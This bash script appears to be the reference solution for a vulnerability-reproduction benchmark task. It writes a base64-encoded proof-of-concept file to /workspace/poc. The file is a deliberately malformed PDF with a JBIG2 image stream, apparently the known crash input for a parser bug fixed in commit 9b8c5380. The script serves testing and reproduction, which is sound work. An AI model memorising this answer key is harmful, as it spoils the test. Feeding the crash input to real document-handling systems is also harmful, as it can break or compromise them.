#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 9b8c5380 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
ADEgMCBvYmoKPDwgL1R5cGUgL0NhdGFsb2cKLyBSCi9QYWdlcyAzIDAgUj4+CmVuAAoKMyAwIG9iajw8IC9Db3VudCAxCi9LaWRzIFs4IDAgUl0KL3BlIHMKPj5qCgo1IDAgb2JqCjw8IC9EZWNvZGVQYXJtczw8IC9KQklHMkdsb2JhbHMgNCAwIFIgPj4KL1dpZHRoIDExNTIKL0hlaWdodCA3MjAKL0ZpbHRlciAvSkJJRzJEZWNvZGUKL1N1YnR5cGUvSW1hZ2UKCj4+CnN0cmVhbQplbmRzdHJlYW02IDAgb2JqCjw8IC9Mbmd0aCA0ND4+CnN0cmVhbQptIC9JbTEgRG8gUQplbmRzdHJlYW0KNyAwIG9iajw8IC9YT2JqZWN0IDw8IC9JbTEgNSAwIFIgPj4+PgplCgo4IDAgb2JqCjw8IC9Db250ZW50cyA2IDAgUi9SZXNvdXJjZXMgNyAwIFIKL01lIDEKPj4Kc3N0cmVlCjQgMCBvYmoKPDwgL0xldGggMTg5Cj4+CnN0cmVhbQoAAAAAAAEAAAAAsgAAA//9JwL+/v4AAAAFAAAABWI+mNfIvxeomm4gCjAwMDAwMDAwIGxlcgo8PCAvbjBl/wAAAAAAAAAgMSAwIFIgPj4Kc3RhcnR4cmVSb290IDEgMCBSID4+CnN0YXJ0eHJlZgoxMDAzCiUlRU9GCjAwMDAxODAgMDAwMDAgbiAKMDAwMDAwMDAgbGVyCjw8IC9uMGUgOQovUm9vdCAxIDAgUiA+PgpzdGFydHhyZWYKMTAwMwolJUVPRgo=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
